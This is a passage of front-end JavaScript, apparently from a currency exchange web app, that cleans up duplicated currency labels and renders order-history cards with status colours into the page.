            if (o.status === 'Rejected' || o.status === 'Failed') statusColor = '#f6465d';

            // Fix the "USD USD" bug by cleaning the string
            let sendStr = o.sendAmount ? o.sendAmount.toString() : '';
            let getStr = o.getAmount ? o.getAmount.toString() : '';
            
            // If the string already contains "USD", remove the duplicate
            if (sendStr.includes('USD') && o.sendCurrency === 'USD') {
                // Do nothing, the string already has it
            } else if (o.sendCurrency && !sendStr.includes(o.sendCurrency)) {
                sendStr += ` ${o.sendCurrency}`;
            }

            if (getStr.includes('USD') && o.getCurrency === 'USD') {
                // Do nothing
            } else if (o.getCurrency && !getStr.includes(o.getCurrency)) {
                getStr += ` ${o.getCurrency}`;
            }

            return `
                <div class="card" style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <div style="display: flex; flex-direction: column; gap: 5px;">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <span style="color: ${typeColor}; font-weight: bold; font-size: 14px;">${typeText}</span>
                            <span style="color: #fff; font-weight: 600; font-size: 14px;">${sendStr}</span>
                        </div>
                        <span style="color: #888; font-size: 11px;">${o.date || 'Just now'}</span>
                    </div>
                    <div style="text-align: right;">
                        <div style="color: #fff; font-size: 14px; font-weight: 600;">${getStr}</div>
                        <div style="color: ${statusColor}; font-size: 11px; font-weight: bold; margin-top: 5px; text-transform: uppercase;">${o.status || 'Pending'}</div>
                    </div>
                </div>
            `;
        }).join('');

    } catch (e) {
        document.getElementById('historyPageList').innerHTML = '<p style="color: #f6465d; text-align: center;">Error loading history.</p>';
    }
};
